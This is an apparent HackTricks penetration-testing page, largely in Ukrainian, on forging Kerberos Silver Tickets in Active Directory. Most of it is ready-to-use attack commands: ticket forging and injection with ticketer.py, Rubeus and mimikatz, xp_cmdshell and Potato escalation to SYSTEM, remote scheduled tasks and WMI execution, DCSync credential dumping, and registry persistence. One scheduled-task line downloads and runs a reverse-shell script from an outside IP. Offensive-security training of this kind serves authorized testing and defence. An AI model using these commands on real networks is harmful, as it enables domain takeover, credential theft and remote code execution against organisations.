# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

Атака **Silver Ticket** полягає в експлуатації service tickets у середовищах Active Directory (AD). Цей метод базується на **acquiring the NTLM hash of a service account**, наприклад a computer account, для підробки Ticket Granting Service (TGS) ticket. За допомогою такого підробленого ticket зловмисник може отримати доступ до певних сервісів у мережі, **impersonating any user**, зазвичай прагнучи до адміністративних привілеїв. Наголошується, що використання AES keys для підробки tickets є більш безпечним і менш виявним.

> [!WARNING]
> Silver Tickets менш помітні, ніж Golden Tickets, оскільки вони потребують лише **hash of the service account**, а не krbtgt account. Однак вони обмежені конкретним сервісом, на який спрямовані. Також достатньо просто вкрасти пароль користувача.
> Якщо ви скомпрометували **account's password with a SPN**, ви можете використати цей пароль, щоб створити Silver Ticket, який імперсонуватиме будь-якого користувача для цього сервісу.

For ticket crafting, different tools are employed based on the operating system:

### На Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### На Windows
```bash
# Using Rubeus
## /ldap option is used to get domain data automatically
## With /ptt we already load the tickt in memory
rubeus.exe asktgs /user:<USER> [/rc4:<HASH> /aes128:<HASH> /aes256:<HASH>] /domain:<DOMAIN> /ldap /service:cifs/domain.local /ptt /nowrap /printcmd

# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
Сервіс CIFS виділяють як поширену ціль для доступу до файлової системи жертви, але також можна експлуатувати інші сервіси, такі як HOST і RPCSS, для виконання завдань та WMI-запитів.

### Приклад: служба MSSQL (MSSQLSvc) + Potato to SYSTEM

Якщо у вас є NTLM hash (або AES key) облікового запису служби SQL (наприклад, sqlsvc), ви можете підробити TGS для MSSQL SPN і impersonate будь-якого користувача для SQL service. Далі увімкніть xp_cmdshell, щоб виконувати команди від імені облікового запису служби SQL. Якщо цей token має SeImpersonatePrivilege, запустіть Potato для підвищення до SYSTEM.
```bash
# Forge a silver ticket for MSSQLSvc (RC4/NTLM example)
python ticketer.py -nthash <SQLSVC_RC4> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- Якщо в отриманому контексті є SeImpersonatePrivilege (часто буває для service accounts), використовуйте Potato variant, щоб отримати SYSTEM:
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
More details on abusing MSSQL and enabling xp_cmdshell:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Potato techniques overview:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Доступні сервіси

| Тип служби                                | Служби (Silver Tickets)                                                   |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Залежно від ОС також:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>Іноді можна просто запросити: WINRM</p>            |
| Заплановані завдання                       | HOST                                                                       |
| Windows File Share, also psexec            | CIFS                                                                       |
| Операції LDAP, включно з DCSync           | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

Using **Rubeus** you may **ask for all** these tickets using the parameter:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Ідентифікатори подій для Silver tickets

- 4624: Вхід в обліковий запис
- 4634: Вихід з облікового запису
- 4672: Вхід адміністратора

## Persistence

Щоб уникнути того, щоб машини змінювали свій пароль кожні 30 днів, встановіть `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` або можна встановити `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` на значення більше ніж 30 днів, щоб вказати період ротації пароля машини.

## Зловживання сервісними квитками

У наступних прикладах уявімо, що квиток отримано, видаючи себе за обліковий запис адміністратора.

### CIFS

З цим квитком ви зможете отримати доступ до папок `C$` та `ADMIN$` через **SMB** (якщо вони доступні) та скопіювати файли у частину віддаленої файлової системи, просто виконавши щось на кшталт:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Ви також зможете отримати shell на хості або виконувати довільні команди за допомогою **psexec**:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Маючи цей дозвіл, ви можете створювати заплановані завдання на віддалених комп'ютерах та виконувати довільні команди:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

За допомогою цих tickets ви можете **запускати WMI на комп'ютері жертви**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Знайдіть **більше інформації про wmiexec** на наступній сторінці:

{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Якщо маєте доступ до комп'ютера через winrm, ви можете **отримати до нього доступ** і навіть отримати PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Перегляньте наступну сторінку, щоб дізнатися **більше способів підключитися до віддаленого хоста за допомогою winrm**:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Зауважте, що **winrm має бути активним і прослуховувати** на віддаленому комп'ютері для доступу до нього.

### LDAP

Маючи цей привілей, ви можете dump базу даних DC, використовуючи **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Дізнайтеся більше про DCSync** на наступній сторінці:


{{#ref}}
dcsync.md
{{#endref}}


## Посилання

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)



{{#include ../../banners/hacktricks-training.md}}
